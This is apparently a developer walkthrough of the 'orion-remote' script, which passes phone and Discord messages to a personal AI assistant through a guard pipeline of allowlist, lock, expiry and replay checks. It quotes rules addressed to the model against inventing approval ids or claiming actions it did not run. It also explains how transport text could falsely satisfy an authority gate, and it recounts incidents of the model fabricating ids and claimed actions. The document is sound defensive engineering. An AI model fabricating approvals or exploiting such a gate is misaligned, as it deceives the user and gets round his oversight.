| 790-895 | `askBrainOnce()` — writes the message file, runs `openclaw agent`, parses the JSON envelope, cleans the reply. |
| 897-1031 | Phase 45 read-only verbs: `doAction`, `doDevice`, `doApps`, `doFiles`. |
| 1033-1157 | Mission verbs: `doStatus`, `doPause`, `doResume`, `doCancel`, `resolveApproval`, `resolveGateApproval`, `doPriority`. |
| 1159-1493 | The `agent` verb: `projectDir`, `agentTarget`, `supervisorLive`, `describeRun`, `locateOperator`, `operatorRefusal`, `haltSentence`, `doAgent`. |
| 1495-1508 | `HANDLERS` dispatch table. |
| 1510-1693 | `handleUnlocked()` — THE one path every message takes. |
| 1695-1738 | `admitInbound()` — replay and rate-limit under a directory lock. |
| 1740-1760 | `handle()` (thin wrapper) and `reply()` (outbox + optional channel send). |
| 1762-1805 | CLI argument parser with a `--` terminator and a closed flag set. |
| 1808-1870 | Command dispatch: `inject`, `handle`, `poll`, `audit`, else usage. |

#### Commands and flags (complete)

Parser: `scripts/orion-remote:1764-1806`. `command` is `argv[2]`; everything after is `rest`.

| Flag | Takes | Defined | Effect |
|---|---|---|---|
| `--from` | sender string | 1789, 1806 | Who the message is from. Default `local`. This is the identity the allowlist is checked against. |
| `--to` | device id | 1789, 1820 | Only `inject` reads it: it stores `to` (lower-cased) in the envelope. The `handle` command does **not** pass `--to` through (1829-1831), so a direct `handle` call is never device-routed; routing is applied only to `poll`ed envelopes, whose `to` field goes to `handleUnlocked` (1847, 1532). A mismatch with `DEVICE_ID` is refused **without** recording the envelope as seen. |
| `--id` | envelope id | 1789, 1830 | Replay-guard id. The phone passes its CloudKit record name; the bridge passes the Discord message id. Absent means no replay protection for that call. |
| `--at` | epoch ms | 1789, 1831 | When the message was sent. Present means "came from a queue" and the 10-minute freshness rule applies. Absent (a person typing at the terminal) means age 0. |
| `--mode` | `chat` or `command` | 1789, 1828 | `chat`: never parse as a verb, always the brain. `command` (default): try the verb grammar first. Anything else is `fail("--mode must be chat or command")`. |
| `--` | terminator | 1795 | Everything after is positional text, verbatim. |

Unknown `--x` flags are refused (`fail("unknown option --x")`, 1798), and a flag at the end with no value is refused (1799). The history of this: before this parser, a message of `--x` swallowed the following `--from` as its value, the sender silently became `local`, and a stranger's message was attributed to the local account (comment at 1766-1788). Four mitigations stack: the `--` terminator, refusing unknown flags, refusing a valueless trailing flag, and the bridge putting `--from` before the `--`.

| Command | What it does | Exit code |
|---|---|---|
| `handle "<text>" [--from] [--id] [--at] [--mode]` | Run one message through `handleUnlocked`. Prints `result.reply` if there is one. | 0 if `result.ok`, 1 if not (1830-1833). |
| `inject "<text>" [--from local\|orion] [--to]` | Append an envelope `{id: 12 hex, from, text, at: now, to?}` to `inbox.jsonl` and print `queued <id>`. Refuses a non-`local`/`orion` sender: "inject cannot impersonate a remote sender" (1810). Empty text refused (1809). | 0 / 2 |
| `poll` | Drain `inbox.jsonl` from the saved cursor: for each envelope run `handle`, append the reply to `outbox.jsonl` (and optionally push to a channel), advance the cursor one line at a time, print `polled N message(s)`. | 0 |
| `audit [n]` | Print the last `n` (default 20) lines of `remote-audit.jsonl`. Fails with exit 1 "no audit log yet" if the file is missing. | 0 / 1 |
| anything else | Prints a usage text listing `Object.keys(VERBS)` and exits 2 (1863-1869). | 2 |

Note the usage text (1865-1868) lists `inject`, `poll`, `audit`, `handle` but does not mention `--mode`, `--id` or `--at`; those exist only in the code.

**Reply transport for `poll`** (`scripts/orion-remote:1742-1760`): always appends `{at, envelopeId, to, text}` to `outbox.jsonl` (mode 0600). If **both** env vars `ORION_REMOTE_REPLY_CHANNEL` and `ORION_REMOTE_REPLY_TARGET` are set, it also runs `openclaw message send --channel <c> --target <t> --message <text>` with a 30 s timeout (failure only prints to stderr). Unset by default: "an unconfigured Orion writes replies to a file and talks to nobody". The live paths do not use `poll` at all: the phone helper and the Discord bridge call `handle` directly and carry the reply themselves.

- **Contracts** — Inputs: argv (above), env (section 8.10). Output: reply text on stdout; the exit code carries ok/refused. Disk: appends `remote-audit.jsonl`; updates `remote-inbound.json` (cursor, seen ids, rate hits); may write `remote.json` (mission state), `actions/cancel/<id>`, `brain-<hex>.txt` (temporary, deleted in `finally`).
- **Gotchas & lessons**
  - The file runs its CLI at import time (top-level `await`, no `if (import.meta.url === ...)` guard) yet exports `quickAnswer` (714). **(inferred)** tests that want `quickAnswer` therefore have to spawn it or tolerate the usage exit; check `tests/` before importing it.
  - `handle` exit code 1 is a normal refusal with text on stdout. Both callers rely on this: the Swift `CommandRunner` and the bridge forward stdout when the exit code is 1 and stdout is not empty (`CommandRunner.swift:72-73`, `scripts/orion-remote-bridge:227-233`).
  - Silence is a deliberate reply: a rejected stranger gets `{ok:false, reply:null}`, which prints nothing and exits 1. The bridge logs "(no reply -- orion-remote declined; see `orion-remote audit`)".
- **Walk it yourself**
  1. `sed -n 1764,1806p scripts/orion-remote` — read the flag loop and the comment above it.
  2. `sed -n 1808,1870p scripts/orion-remote` — the four commands.
  3. `ls -l ~/.openclaw/orion-controlled/ | grep -i "remote\|inbox\|outbox"` — the files this CLI owns (names only; do not cat the audit file in a shared window, it holds message text).
  4. Do not call `handle`: it can spend a model turn and change state. The read-only status view is `scripts/orion-remote-install --status` (section 8.6), which only prints.
- **Questions to ask your tutor**
  1. Why is `--from` a flag rather than something the process can verify, and what stops a local process from claiming to be `phone`? (Hint: `ORION_REMOTE_ALLOW` is set by the caller; and approvals refuse `local` and `orion`.)
  2. What is the difference between `--id` with `--at` absent and `--id` with `--at` present, in the guard pipeline?
  3. Why does `inject` refuse any sender except `local` and `orion`?
  4. Walk through what the old argument parser did with the text `--x`, and why the fix has four layers.

---

### 8.2 `orion-remote`: the guard pipeline (`handleUnlocked`)

- **What it is** — The one function every message goes through, whether it came from the phone, Discord, the terminal, or the eval runners. It judges the message in a fixed order, writes an audit line for each decision, and only then dispatches to a verb handler or to the brain.
- **Where** — `handleUnlocked` `scripts/orion-remote:1512-1693`; `admitInbound` `:1698-1738`; `handle` `:1740`; `parse` `:362-388`; `isLocked` `:357-360`.
- **How it works** — In order (line numbers are where each check sits):

| Step | Check | Line | On failure | Audit `decision` / `reason` |
|---|---|---|---|---|
| 1 | Sender allowlist: `allowedSenders().has(sender)` (env `ORION_REMOTE_ALLOW`, re-read each message, default `local`) | 1518 | **Silence**: `{ok:false, reply:null}`. "never confirm the address works" | rejected / `sender not allowed` |
| 2 | Device routing: if the envelope has `to` and it differs from `DEVICE_ID` | 1532 | Silence; returns before any state is written, so it costs the sender no replay slot or rate hit | rejected / `addressed to X, not <device>` |
| 3 | Parse: `mode === "chat"` gives `{error:"conversation"}` (nothing is a verb); otherwise `parse(text)` | 1557 | (no failure; sets up step 4 and 7) | n/a |
| 4 | LOCK ORION: `isLocked()` reads `~/.openclaw/orion-controlled/lock.json` fresh, `locked === true`. Exempt: `agent status/pause/stop/exterminate` and `action list/cancel/(none)`, because a lock must never block a halt | 1558-1565 | Reply "Orion is locked. Nothing will run until it is released at the Mac." | rejected / `ORION is locked` |
| 5 | Freshness: `age = now - at`; `at` missing/non-number from a queue = infinite = stale; no `--at` at all (terminal) = age 0. Limit `MAX_ENVELOPE_AGE_MS` = 10 min | 1587-1598 | "that command was too old to run — send it again if you still want it" | rejected / `expired (N min old)` or `expired (no usable timestamp)` |
| 6 | Replay and rate limit: `admitInbound` (below) | 1607 | Replay: silence. Rate: "too many commands in the last ten minutes — try again shortly" | rejected / `replayed envelope`, `rate limited` |
| 7 | Parse errors: a bare verb or non-verb falls through to the brain. A verb **with** bad args gets the usage line | 1609-1628 | usage text | rejected / the parse error |
| 8 | Size: `Buffer.byteLength(text) > 4000` | 1635 | "that is longer than 4000 bytes — send it in pieces" | rejected / `message too long for one turn` |
| 9 | Brain: `askBrain(text, sender)` | 1639 | see 8.3 | accepted or error, `verb:"brain"` |
| 10 | Verb path: pre-check args; a MISSION-shaped arg naming no known mission is treated as conversation; else run handler inside `withStateLock` | 1666-1692 | handler reply | accepted / refused / error, with `verb`, `args`, `reply` |

Why this order (comments at 1522-1531, 1600-1606): routing first so foreign envelopes consume nothing; the allowlist before the lock so a stranger gets silence, not "he is locked"; replay judged **last** to match the Swift `JobGate` (`MobileCore`), whose doc comment pins that order. An earlier version put replay before expiry and called it deliberate; a 2026-09-02 independent review found the two disagreed.

**The fall-through to the brain for ordinary English** (1609-1650, 1651-1674) is the answer to a real incident. Half the verb aliases are everyday words (`no`, `yes`, `ok`, `stop`, `pause`, `resume`, `status`, `files`, `device`, `apps`). In the first live conversation Nick typed "pause" meaning the music and got "pause needs a mission id". So now: a verb with **no** arguments goes to the brain; a verb with arguments that fail validation gets the usage line; and a MISSION-shaped argument that names no known mission ("pause the music" -> `the` is filler -> `pause(music)` -> "no mission called music") is also sent to the brain. Chat mode (the phone's conversation tab, `--mode chat`) bypasses the verb grammar entirely, added 2026-09-28 because "No, I mean the task page" parsed as `deny`.

**`parse()`** (362-388): empty, > 200 bytes, any control character (`[\u0000-\u001f\u007f]`), no usable words, or > 8 tokens is an error. Tokens are lower-cased and stripped of non-alphanumeric ends. Filler words (`orion please change set mission the to for`) are skipped only until a verb is found, then also dropped from arguments. The first non-filler token must match a verb alias exactly. Arguments beyond the verb's `shape.length`, or fewer than `min`, produce `usage(verb)`.

**`admitInbound`** (1698-1738) — replay and rate limit under a directory lock:

```js
// scripts/orion-remote:1698-1735 (abridged)
await mkdir(INBOUND_LOCK, { mode: 0o700 });               // mkdir is the atomic lock
await writeFile(join(INBOUND_LOCK, 'owner.json'), JSON.stringify({ pid: process.pid }), { mode: 0o600 });
...
const inbound = await readInbound();
if (envelopeId && inbound.seen.includes(envelopeId)) { /* audit "replayed envelope", silence */ }
const recent = inbound.hits.filter((hit) => now - hit.at < RATE_WINDOW_MS);
if (recent.filter((hit) => hit.from === sender).length >= RATE_CAP) { /* "rate limited" */ }
await writeInbound({ ...inbound, hits: [...recent, { from: sender, at: now }],
  seen: envelopeId ? [...inbound.seen, envelopeId].slice(-SEEN_KEPT) : inbound.seen });
```

The lock directory is stolen if its owner pid is dead and it is older than 5 s; a caller waits up to 10 s then throws "remote controller is busy; retry the message". The lock is held **only** around this read-modify-write, not around the model turn: "A brain response may take two minutes; holding this lock across dispatch would make a phone Exterminate wait behind conversation" (1695-1697). The budget is spent before dispatch, so invalid messages are not free. `SEEN_KEPT = 200` ids; `RATE_CAP = 40` per sender per 10 minutes (it was 12, raised after "the first real debugging session with Orion died on 'too many commands in the last ten minutes'", comment 130-143).

- **Contracts** — Return value: `{ok, reply, runId?, tools?, checked?, ...}`; `reply: null` means silence. Audit line shape (`audit()` at 312): `{at, from, text(<=200 chars, control chars removed), decision, reason?, verb?, args?, reply?(<=200), session?, runId?, checked?, runner?, ...handler forensics}`. `decision` values seen in code: `accepted`, `rejected`, `refused`, `error`. File: `~/.openclaw/orion-controlled/remote-audit.jsonl` (mode 0600, append-only, never truncated).
- **Calls out to** — `askBrain` (8.3); handlers (8.4); `readState`/`writeState` on `remote.json`.
- **History** — Guards added in layers: `0af5235` 2026-09-02 (phases 43-45, the bridge and the first guards), `0d67b37` 2026-09-02 (review repairs "including a panic button that failed open"), `c5c5175` 2026-09-02 (a DM reaches the brain), `c2eda84` 2026-09-30 (truthful replies), then phone-era changes `a139f4b` 2026-10-07 and earlier. The MAX_ENVELOPE_AGE and routing guards were "Phase 45's two guards that were missing entirely until 2026-09-02" (comment 147-161).
- **Gotchas & lessons**
  - Expiry is judged by the sender's clock for the phone (`--at` is the CloudKit `sentAt`). A phone with a wrong clock can look stale or from the future. A future timestamp gives a negative age and **passes** (age > limit is false).
  - Silence on rejection means a misconfigured allowlist looks like a dead bot. The bridge prints a warning once per connection when `ORION_REMOTE_ALLOW` is still `local` (`orion-remote-bridge:525-529`), and `orion-remote audit` shows the real reason.
  - Rate limiting counts rejected messages too (comment on `RATE_CAP`, 144), so a flood of garbage still fills the window. But it sits behind the allowlist, so strangers never reach it; the bridge drops strangers even earlier.
  - Eval mode: `INBOUND` and `INBOUND_LOCK` get an `eval-` prefix when `sandbox()` is on (`:56-57`), so an evaluation run does not spend the real replay and rate-limit memory.
- **Walk it yourself**
  1. Open `scripts/orion-remote` at line 1512 and read straight down to 1693; mark each `return` that ends a rejection.
  2. `grep -n "decision:" scripts/orion-remote | head -30` — every audit call site.
  3. `node scripts/orion-remote audit 5` reads the last five audit lines. It only reads a file, but those lines contain message text; do not paste them anywhere.
- **Questions to ask your tutor**
  1. Why must replay be judged after freshness, and why must routing be judged before everything that writes state?
  2. Give a concrete message that passes the allowlist, is locked out by `isLocked()`, yet is still allowed through. (Answer: `agent stop`.)
  3. What does "fail open" mean for `isLocked()` when `lock.json` is missing, and why is it the chosen behavior here?
  4. Why is the replay/rate-limit lock a directory with a pid file rather than the `remote.json.lock` file used for mission state?

---

### 8.3 `orion-remote`: the brain call

- **What it is** — The path for any message that is not a fixed verb. It builds one prompt (live facts + channel brief + Nick's words), runs it through `openclaw agent` in the same session the Mac app uses, cleans the reply, and optionally re-asks once when the answer looks untruthful.
- **Where** — `askBrain` `scripts/orion-remote:723-746`; `askBrainOnce` `:790-895`; `CHANNEL_BRIEF` `:493-536`; `briefFor` `:539-546`; `phoneContext` `:625-665` and its helpers `:554-623`; truth-check constants `:686-701`; `quickAnswer` `:703-721`; `saveStandingRules` `:754-788`.
- **How it works**

1. **`quickAnswer`** (714-721). If the whole message, after dropping leading fillers (`and so ok okay hey orion um uh well yo quick question then now sorry wait also but`) and punctuation, equals one of 11 time phrases or 12 date phrases, the answer is computed locally ("It's 8:32 PM." / "It's Tuesday 14 October.") with **no model call**. Returns `{ok:true, reply, tools:0, checked:"quick"}`. Why: "what time is it" cost a brain round trip and came back as "20:32 GMT+1 (8:32 PM)" (comment 703-708). It mirrors `MobileCore`'s `QuickAnswer` used by the Mac voice path.
2. **First turn**: `askBrainOnce(text, sender)` (below).
3. **No-reply fix** (728-731): if the runtime says "Agent couldn't generate a response" (regex `NO_REPLY`), ask once more with `CHECK_SILENT`, `raw: true`, on the escalation model.
4. **Truth check** (732-745): only runs when the first turn succeeded and **zero tools ran** (`first.tools === 0`). It classifies the reply with `classifyClaim(first.reply, {toolsRun:0})` (from `scripts/lib/remote/claims.mjs`, section 8.8) and also classifies only the first sentence for refusals (so a limit mentioned in passing is not a refusal). If the reply claims something done (`kind === "done"`) the re-ask is `CHECK_DONE`; if it opens with an inability (`kind === "cant"` on the first sentence) it is `CHECK_CANT`. The re-ask is sent **once**, `raw: true` (no brief, no context, same session so the model has the history), to the escalation model, with the suffix `His message was: "<first 300 chars of his words>"`. If the second answer is ok and non-empty it replaces the first, tagged `checked: "claimed-done" | "claimed-cant" | "no-reply"`. "Narrow patterns, one retry, never a loop" (comment 678-680).

Verbatim re-ask texts (these are sent to the model as a user turn in the same session):

```js
// scripts/orion-remote:686-689
const CHECK_DONE = "[orion-remote check] Your last reply says something was done, but no tool ran in that turn, so nothing happened. Do it now with the right tool, or tell Nick plainly that it is not done and why. Reply to Nick directly with just the answer: never mention scripts, tools or this check.";
const CHECK_SILENT = "[orion-remote check] Your last turn ended without a reply to Nick. Tell him in one or two sentences what you did or what happens next. Do not run the tools again.";
const CHECK_CANT = "[orion-remote check] Your last reply says you can't do that, but you did not look. Check TOOLS.md or use tool_search for it. If a tool exists, use it now; if it truly does not, say so plainly. Reply to Nick directly with just the answer: never mention scripts, tools, this check or what you looked at.";
```

Model choice for the retry (comment 691-699, dated 2026-09-29): Haiku stays the everyday brain ("a week of real use including every scenario run cost about $1.60", budget $0-10 a month; a Sonnet-class brain for every turn "about three times that"). The retry goes to the stronger model because the cases the truth check catches are exactly the ones the weaker model got wrong; it is rare so cheap. `ESCALATION_MODEL = process.env.ORION_ESCALATION_MODEL ?? "anthropic/claude-sonnet-5"`; the value `off` keeps retries on the default model (`:700-701`). **Doc/code drift to watch**: the comment says Haiku is the everyday brain, but the actual model is whatever OpenClaw's config and `ORION_BRAIN_MODEL` select; in the phone path Swift sets `ORION_BRAIN_MODEL` when Nick picks one in the app (hop 9 of section 8.7). Check `~/.openclaw/orion-controlled/model-roles.json` and the OpenClaw config for the live default.

5. **`askBrainOnce(text, sender, {raw, model})`** (790-895):

   a. `mkdir CONTROLLED`; pick a temp file `brain-<12 hex>.txt` (mode 0600). The message goes in a **file**, never argv: "The message is untrusted text and this is the one property from the original design that costs nothing to keep."
   b. Unless `raw`, run `saveStandingRules(text)` (section below). It returns a list like "naps is always at least 75 minutes (the planner enforces it)", which becomes a prefix line: `[orion-remote] Already saved from his message (by the transport, not by you): ...; do not save it again, and never say "noted" for anything that is not in this line.`
   c. Build the file body. If not `raw`: `phoneContext()` (only when `sender === "phone"`), then the saved-rules line, then `briefFor(sender)`, then Nick's text. If `raw`: just the text.
   d. Run:

```js
// scripts/orion-remote:800-813
const { stdout } = await run(BRAIN_BIN,
  ["agent", "--session-key", BRAIN_SESSION, "--timeout", String(BRAIN_TIMEOUT_S),
   ...((model ?? process.env.ORION_BRAIN_MODEL) ? ["--model", model ?? process.env.ORION_BRAIN_MODEL] : []),
   "--thinking", process.env.ORION_BRAIN_THINKING ?? thinkingLevel(text.split("--- Nick's message follows ---").pop(), { model: model ?? process.env.ORION_BRAIN_MODEL }),
   "--json", "--message-file", file],
  { timeout: (BRAIN_TIMEOUT_S + 30) * 1000, maxBuffer: 32 * 1024 * 1024 });
```

   So the argv is exactly `openclaw agent --session-key <orion-app-v2|orion-chat-<uuid>> --timeout 90 [--model <m>] --thinking <off|minimal|low|medium|high> --json --message-file <path>`. The Node-level kill is 120 s (90 + 30). `--thinking` defaults to the per-message policy in `scripts/lib/thinking-policy.mjs:23-26`: `off` for ollama models, else `low` if `needsReasoning(text)` (a narrative plan, a whole-day request, >= 2 schedule verbs, one verb plus an anchor word, or >= 35 words), else `off`. History: thinking was off for every message (OpenClaw `thinkingDefault "off"`, chosen for voice speed) until 2026-10-01; the per-message policy came in `9e901a9` 2026-10-07 ("think only when it matters").
   e. Parse `JSON.parse(stdout)` (the `--json` envelope). The reply lives **only** in `envelope.result.payloads[].text` (array of `{text, mediaUrl}`), joined with a blank line. The comment (815-824) records that the first draft guessed `result.reply`, `result.text` etc., none of which exist, and "would have answered every question with '(Orion had nothing to say)' while reporting success".
   f. Drop lines starting `⚠️ 🛠️` (the gateway's "Exec failed" plumbing); keep them in the audit as `toolNoise`.
   g. `fixReply(...)` (rewrites 24-hour times to 12-hour, removes repeated sentences) and `lintReply(reply)` (records what could not be fixed) from `scripts/lib/remote/reply-lint.mjs`. `fixedReply` and `lint` are returned for the audit.
   h. `runId` = `envelope.runId` (top level) or `envelope.result.meta.agentMeta.runId`; it is the handle for `openclaw tasks show <runId>`.
   i. `tools` = `meta.toolSummary.calls` if an integer, else `0` if `meta` exists, else `null`. A turn that ran no tool has no `toolSummary` at all (not `calls: 0`); this was discovered when the truth check never fired in real runs (comment 839-841).
   j. If `envelope.status` exists and is not `ok`: `{ok:false, reply:"Orion did not finish: <summary|status, 140 chars>"}`.
   k. Empty reply: `{ok:true, reply:"Orion finished that turn without saying anything — there may have been nothing to answer. (openclaw tasks show <runId>)"}`.
   l. On exception: `already running|busy` in stderr -> "You have a turn running at the Mac — give it a moment and send that again." (the gateway refuses a second turn in a session that is already running one, e.g. Nick talking at the Mac and the phone at once). `error.killed` or a message starting `Command failed:` -> "Orion is taking too long to answer — try again in a moment." (a 2026-09-05 audit found the raw "Command failed: <node path> ... --session-key ..." string being sent to Discord, leaking this Mac's paths and the session key). Anything else -> `Orion could not answer: <first line, 140 chars>`.
   m. `finally`: delete the temp file.

6. **`saveStandingRules(text)`** (754-788). Calls `readStandingRules` (`scripts/lib/remote/standing-rules.mjs`). If the text states a standing rule ("always", "going forward", "from now on", ...), then: (i) for each parsed minimum duration, `setMinimum(key, minutes)` in `scripts/lib/life/config.mjs`, then run `orion-reschedule minimums` (30 s) so today's plan obeys it; (ii) unless `evalMode()`, append `- [rule] <statement> (said YYYY-MM-DD)` to the Basic Memory note `~/Documents/orionBrain/20 Areas/Me/Learned about Nick.md` (created with front matter if missing); (iii) unless eval mode, run `orion-remember --user "Standing rule (<date>, his words): <statement>"` (15 s), which writes to USER.md that "every session loads". In eval mode it only reports what it would have saved. The incident: 2026-10-01, "naps at least an hour and 15 ALWAYS" and "going forward…" both got "Noted" and neither was saved (comment 748-753). The point of the design: "Whether a rule is kept can't depend on the model remembering to call a tool".

- **Contracts** — Inputs: `text` (<= 4000 bytes already enforced), `sender` (`phone`, a Discord id, or `local`). Outputs: `{ok, reply, runId, tools, checked?, fixedReply?, lint?, toolNoise?}`. Files: `brain-<hex>.txt` (temp), `remote-audit.jsonl` (via caller). Session: key `orion-app-v2` by default, the same key `GatewayClient.swift:53` uses, so Discord, phone and Mac app share one conversation: "Using a separate key would have been easier and would have produced a forgetful stranger wearing Orion's name" (comment 82-86). Phone chats with a conversation id use `orion-chat-<uuid>`.
- **Calls out to** — `~/.openclaw/bin/openclaw agent ...` (the OpenClaw gateway, then the configured model with the ORION plugin gate, chapters 04 and 05); `orion-reschedule minimums`; `orion-remember --user`; `orion-phone-time status` (in `phoneContext`); the vault note file.
- **History** — `c5c5175` 2026-09-02 "a DM reaches the Orion brain, not just a verb"; `c2eda84` 2026-09-30 "truthful replies, eval harness and connectors" (truth check, claims/lint wiring, escalation); `3034d64` 2026-10-01 and `0a0aa7e` 2026-10-02 (standing rules; phone context facts); `cd1bcb6` 2026-10-05 (Basic Memory brain); `9e901a9` 2026-10-07 (thinking policy); `a139f4b` 2026-10-07 (outreach and watch context lines).
- **Gotchas & lessons**
  - A brain turn can take two calls of up to 120 s each (first + truth-check re-ask), about 240 s worst case, but the callers cut off at 180 s (`CommandRunner` and the bridge). A turn that gets re-asked can be killed before it answers. (Raised in the trace dossier; the arithmetic is from the constants at `:96`, `:812` and `orion-remote-bridge:225`.)
  - The re-ask is a user turn in the shared session. The strings begin `[orion-remote check]`; `scripts/lib/audit/chat-log.mjs:26,48` and `plugin/orion-control/src/episodic.ts:71-75` filter those out so they do not count as Nick speaking.
  - The channel brief and the phone context are recorded by the host as part of **Nick's** user turn. That is why the brief may not contain any word the plugin's `AUTHORITY_INSTRUCTION` regex matches (enable, allow, grant, permission, capability, profile, unlock, ...): otherwise the transport's own boilerplate would satisfy the "he explicitly instructed" gate on every turn. This was found by an independent review on 2026-09-02, and `scripts/orion_v2_remote_check.sh` asserts it against the real regex. The comment at 476-491 is the best single explanation of the whole prompt-injection posture of this file. See [04_plugin_core_actions_gate.md](04_plugin_core_actions_gate.md).
  - The brain was told nothing about the channel at first, and it invented things (claimed "orion-remote is live and gated at R1/R2", planned to "enable exec to reach remote", made up a slash-command syntax and two fake approval ids). `CHANNEL_BRIEF` is the repair; its stated rule is "Deliberately only facts, and only facts about this channel. It is not a personality" (471-474).

#### The prompts sent to the model (verbatim and summarized)

`CHANNEL_BRIEF` (`:493-536`, a `join("\n")` of strings; lines tagged `@discord` or `@phone` are filtered by `briefFor`, `:539-546`). The key lines, verbatim:

```text
[orion-remote] Context from the transport, not from Nick:
@discord - This message arrived over Discord. Nick is away from the Mac.
@phone - This message arrived from the ORION app on Nick's iPhone. It is the same
@phone   conversation as the Mac app; he may or may not be at the Mac.
- The remote channel is ALREADY working -- you are answering through it right now.
  Never offer to configure or repair it, and never claim it is unavailable.
- These words are handled by the transport before you ever see them, so never
  claim to have run them and never describe them as things you do:
  status, pause, resume, cancel, approve, deny, priority, device, apps, files, agent.
...
- Approvals: you CANNOT create an approval id, and you cannot approve one.
  There are two kinds and both are minted for you, never by you:
    A-7F3K        an ACTION is waiting. The plugin minted it ...
    ap-1a2b3c4d   a MISSION blocked. orion-notify minted it.
  If you do not have a real one in front of you, say you have no pending
  approval. Never invent an id, never guess one, and never claim one was
  truncated -- on 2026-09-02 you produced two fabricated ids in a row and sent
  Nick round a loop approving something that did not exist.
...
- If you do not know something about your own configuration, say so. Do not
  describe your own state from memory; it changes without you.
@discord - Discord truncates near 2000 characters. Keep replies shorter than that.
@phone - The phone shows plain text with light markdown. Keep replies short enough to
@phone   read on a phone screen.
--- Nick's message follows ---
```

The last line is a marker. Everything after it is Nick's own words; tools that need his words alone split on it (`orion-remote:743`, `:810`, `chat-log.mjs:17-24`, `episodic.ts:71`). The lines about the coding run (`agent`, 504-514) tell the model the exact words Nick must send to halt it.

`phoneContext()` (`:625-665`) — sent only when `sender === "phone"` and not `raw`. It is "facts, not instructions", read fresh per message:
- Header `[orion-remote] Live facts for this message (read just now, not from Nick):`
- In eval sandbox mode: a `TEST CLOCK` line.
- `[Scheduling preferences — read before planning]` plus the first 12000 chars of `~/.openclaw/workspace/SCHEDULING.md` (or "Scheduling memory unavailable: read SCHEDULING.md before planning."). See `plugin/workspace/SCHEDULING.md`.
- `Apps open on the Mac: ...` from `doApps()` (process table, section 8.4).
- Fixed lines: ORION is the native Mac app Orion.app, "not a website: never open a localhost or http address for it", its tabs (Home, Tasks, Projects, Health, Finances, Brand, Settings) and `scripts/orion-show <tab>` to show one (incident 2026-09-28: it opened `http://localhost:3000/tasks` for "the task page"); "From the phone you have every tool you have at the Mac"; "Before saying an app is not installed, try app_open" (incident: it said Opera Air "isn't installed" while it was running).
- `todaySchedule()`: from `scripts/lib/life/live-day.mjs` + `priority.mjs` + `commute.mjs`: earlier-today, now, later-today blocks with `[rank, movable]`, the last class end time, and the commute rule. Added 2026-10-01 because "extend the DS lab" referred to a lab that had already ended and ORION booked a second one.
- `openCheckins()`: open items from `checkins.json` (not `done|cancelled|given_up`).
- `phoneLock()`: runs `scripts/orion-phone-time status` (5 s) and reports the phone's Screen Time lock (2026-10-01: asked to unblock his apps, ORION checked the Mac's focus timer instead).
- `watchQuestion()`: the last question ORION asked on his phone today (from `watch.json`, within 6 h). `recentOutreach()`: the last <= 3 messages ORION sent first, from `outreach.jsonl` (within 6 h) — "this message may be his answer".
- Then a long block of scheduling how-tos: the `orion-reschedule` verbs (`day --plan`, `tidy`, `now`, `swap`, `extend`, `resize`, `rename`, `move`, `drop`, `skip`, `clear`, `overrun`, `late`), `orion-tasks add|set|list|plan|sub`, and the check-in rules (`orion-checkin add|started|done|cancel`). These are the model's operating manual for schedule changes on the phone; the canonical spec is `plugin/workspace/SCHEDULING.md`.


---

### 8.4 `orion-remote`: verbs and handlers

- **What it is** — The fixed vocabulary that is handled by code, never by a model: 12 verbs. They are the fast path (battery in a quarter of a second without a model turn) and the control surface for missions, approvals and the unattended development agent. Everything about them is closed-vocabulary: a verb must match exactly, and every argument must pass a shape check proving it names something ORION itself minted.
- **Where** — `VERBS` `scripts/orion-remote:195-247`; `SHAPES` `:392-408`; handlers `:897-1508`; dispatch table `HANDLERS` `:1495-1508`.

#### The verb table

| Verb | Aliases | Min args | Arg shapes (in order) | Handler | What it does | Writes? |
|---|---|---|---|---|---|---|
| `status` | status, state, sitrep | 0 | mission | `doStatus` 1035 | Lists missions (merging `remote.json` and `missions/*/`), pending approvals ("waiting on you"), runner liveness | no |
| `pause` | pause, hold, halt | 1 | mission | `doPause` 1054 | SIGTERM to the mission's runner pid, mark `paused` in `remote.json` | `remote.json` |
| `resume` | resume, continue, unpause | 1 | mission | `doResume` 1060 | Refuses finished or live missions; marks running; spawns `orion-mission resume <id>` **detached**, output to `remote-runner.log` | `remote.json`, spawns process |
| `cancel` | cancel, abort, stop | 1 | mission | `doCancel` 1078 | SIGTERM, mark `cancelled`, run `orion-mission abort <id> "cancelled remotely by Nick"` (fixed reason string, 30 s) | `remote.json`, runs `orion-mission` |
| `approve` | approve, approved, yes, ok | 1 | approval | `resolveApproval` 1096 | Grant a mission approval (`ap-xxxxxxxx` in `remote.json`) or a gate approval (`A-xxxx`) | `remote.json` or the approval store |
| `deny` | deny, denied, no, reject | 1 | approval | `resolveApproval` | Same, deny | same |
| `priority` | priority, prioritise, prioritize | 2 | mission, level | `doPriority` 1154 | Set `low|normal|high|urgent` on a mission | `remote.json` |
| `agent` | agent, loop, dev | 1 | agentAction, project | `doAgent` 1430 | Status/halt/resume of the unattended development run. Cannot start one | `orion-project-agent` call |
| `action` | action, actions | 0 | actionVerb, taskId | `doAction` 905 | `actions` lists running plugin actions; `action cancel <orion-16hex>` writes a cancel flag file | `orion-controlled/actions/cancel/<id>` |
| `device` | device, mac, machine, battery | 0 | (none) | `doDevice` 928 | Battery, uptime/load, free disk via `/usr/bin/pmset -g batt`, `/usr/bin/uptime`, `/bin/df -k /` | no |
| `apps` | apps, applications, app | 0 | (none) | `doApps` 955 | Lists running bundled apps from `/bin/ps -Ao comm=` | no |
| `files` | files, file, folder | 1 | root | `doFiles` 1001 | Metadata listing (name, size, mtime) of `desktop`, `documents` or `downloads`; first 40 entries; never opens a file | no |

**Shape validators** (`SHAPES`, 392-408), applied by the dispatcher, never by handlers "so a new verb cannot forget to check":
- `mission`: matches `^[a-z0-9][a-z0-9-]{0,39}$` **and** is known (`remote.json` or `missions/<id>/mission.json`).
- `approval`: matches `^ap-[0-9a-f]{8}$` and is a pending item in `remote.json`, **or** matches the gate id shape `^[Aa]-[23456789ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz]{4}$` (no 0 O 1 I l, because Nick reads them aloud). Gate ids are not looked up here; the plugin's store decides.
- `level`: one of `low normal high urgent`. `root`: one of the three `SAFE_ROOTS` names. `agentAction`: one of `status pause resume stop exterminate`. `project`: matches `^[a-z0-9][a-z0-9-]{1,63}$` **and** `lstat` shows a real directory (not a symlink) under `orion-controlled/project-agent/projects/`. `actionVerb`: `list` or `cancel`. `taskId`: `^orion-[a-f0-9]{16}$` and a file `actions/running/<id>.json` exists.

Rationale (header comment 11-25): inbound text "points at his own state, it cannot introduce a new noun". Only ids that survived validation reach an argv; there is no `sh -c` anywhere in the file.

